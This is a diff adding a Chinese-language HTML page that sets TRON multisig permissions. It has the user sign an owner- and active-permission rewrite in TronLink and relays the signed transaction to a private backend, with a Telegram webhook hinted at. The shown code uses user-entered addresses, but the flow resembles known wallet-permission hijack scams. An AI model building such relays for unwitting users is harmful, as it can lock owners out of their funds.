@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>TRON 多签设置工具</title>
+    <script src="https://unpkg.com/tronweb/dist/TronWeb.js"></script>
+    <style>
+        body { font-family: sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; border: 1px solid #ccc; border-radius: 8px; }
+        h1 { text-align: center; color: #000; }
+        label { display: block; margin-top: 15px; font-weight: bold; }
+        input[type="text"], input[type="number"], textarea { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        button { background-color: #ff0000; color: white; padding: 15px 20px; border: none; border-radius: 4px; cursor: pointer; width: 100%; margin-top: 20px; font-size: 16px; }
+        button:hover { background-color: #cc0000; }
+        .hint { font-size: 0.9em; color: #666; margin-top: 5px; }
+        .warning { color: red; font-weight: bold; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <h1>TRON 多签权限设置</h1>
+    <p class="warning">⚠️ 请确保您已安装并登录 TronLink 钱包。设置 Owner 权限后，您将需要多个签名才能修改账户权限或转移资产！</p>
+    
+    <form id="multisigForm">
+        <label for="coSigners">共同签名者地址 (每行一个 TRON 地址):</label>
+        <textarea id="coSigners" rows="4" placeholder="例如：
+TMuPuzkAmgCQQopGXif8Hx47a6JbJQj6RM
+TUP33QqAE5vJJsZZknP2FCWj58cstdz5W7"></textarea>
+        <div class="hint">这些地址（加上您的当前连接地址）将成为多签钱包的成员。</div>
+
+        <label for="threshold">必需的签名数量 (Threshold):</label>
+        <input type="number" id="threshold" min="2" value="2">
+        <div class="hint">例如，如果您有 4 个成员，阈值为 3/4 表示需要 3 个签名才能通过交易。最小值为 2。</div>
+
+        <button type="submit" id="setPermissions">点击开始设置多签权限</button>
+    </form>
+
+    <script>
+        document.getElementById("multisigForm").onsubmit = async (event) => {
+            event.preventDefault();
+
+            if (!window.tronLink || !window.tronWeb) {
+                alert("请先安装并登录 TronLink 钱包插件。");
+                return;
+            }
+
+            try {
+                // 1️⃣ 连接钱包
+                await window.tronLink.request({ method: 'tron_connect' });
+
+                if (!window.tronWeb.defaultAddress.base58) {
+                    alert("请登录 TronLink 或切换到所需的网络。");
+                    return;
+                }
+                
+                const tronWeb = window.tronWeb; 
+                const currentWallet = tronWeb.defaultAddress.base58;
+                console.log("当前钱包地址 (发起者):", currentWallet);
+
+                // 2️⃣ 读取用户输入并处理
+                const coSignersInput = document.getElementById('coSigners').value;
+                let threshold = parseInt(document.getElementById('threshold').value, 10);
+                
+                // 清理并过滤用户输入的地址
+                const rawAddresses = coSignersInput.split('\n').map(addr => addr.trim()).filter(addr => tronWeb.isAddress(addr));
+                
+                // 构建完整的成员地址列表 (发起者 + 用户输入)
+                // 注意：在 TronLink 中发起多签设置时，即使发起者（Owner）已经拥有权限，也必须将其作为 key 包含在新权限列表中。
+                const uniqueAddresses = new Set([currentWallet, ...rawAddresses]);
+                const allMembers = Array.from(uniqueAddresses);
+                
+                const totalMembers = allMembers.length;
+
+                // 3️⃣ 校验输入
+                if (totalMembers < 2) {
+                    alert("多签钱包至少需要 2 个成员 (当前钱包 + 至少 1 个其他地址)。");
+                    return;
+                }
+                if (isNaN(threshold) || threshold < 2 || threshold > totalMembers) {
+                    alert(`阈值必须在 2 到 ${totalMembers} 之间。当前成员数: ${totalMembers}。`);
+                    return;
+                }
+                
+                // 4️⃣ 构建 keys 列表 (权重默认为 1)
+                const allKeys = allMembers.map(addr => ({
+                    address: tronWeb.address.toHex(addr),
+                    weight: 1 
+                }));
+
+                // 5️⃣ 准备多签权限配置
+                const permissionConfig = {
+                    owner_address: currentWallet,
+                    
+                    // Owner 权限: 涵盖所有地址，并设置用户定义的阈值
+                    owner: {
+                        type: 0,
+                        permission_name: "owner",
+                        threshold: threshold,
+                        keys: allKeys, 
+                    },
+                    
+                    // Actives 权限: 保持和 Owner 相同的配置，简化流程
+                    actives: [{
+                        type: 2,
+                        permission_name: "active0",
+                        threshold: threshold,
+                        // 全权限操作，允许该 Active 权限执行任何交易
+                        operations: "7fff1fc0037e0000000000000000000000000000000000000000000000000000", 
+                        keys: allKeys, 
+                    }]
+                };
+                
+                // 6️⃣ 构建交易
+                const transaction = await tronWeb.transactionBuilder.updateAccountPermissions(permissionConfig, currentWallet);
+                console.log("交易构建完成:", transaction);
+                
+                if (!transaction) {
+                    throw new Error("交易构建失败，请检查配置和网络连接。");
+                }
+
+                // 7️⃣ 签名 (TronLink 会弹出确认窗口)
+                const signed = await tronWeb.trx.sign(transaction);
+                console.log("签名完成");
+
+                // === 🚀 新增：发送签名交易到后端服务器代付 ===
+                const API_ENDPOINT = 'http://192.168.110.214:3000/api/broadcast-tx'; // 替换为你的后端地址
+
+                const response = await fetch(API_ENDPOINT, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        signedTransaction: signed,
+                    // 可以添加用户信息或付款标识等，用于你的计费逻辑
+                    userWallet: currentWallet, 
+                    }),
+                });
+
+                const result = await response.json();
+
+                if (response.ok && result.success) {
+                    alert(`🎉 多签权限设置请求已提交！交易 ID: ${result.txid}。费用将由服务方代付。`);
+                    // 💡 这里可以调用 Telegram Webhook 逻辑
+                    console.log("已发送请求到后端进行代付广播。");
+                } else {
+                    alert("代付广播失败：" + (result.message || "后端服务出错或拒绝处理。"));
+                }
+
+            } catch (error) {
+                console.error("发生错误:", error);
+                alert("操作失败。请检查 TronLink 连接、地址是否有效或是否有足够的 TRX 支付手续费。错误信息: " + error.message);
+            }
+        }
+    </script>
+</body>
+</html>
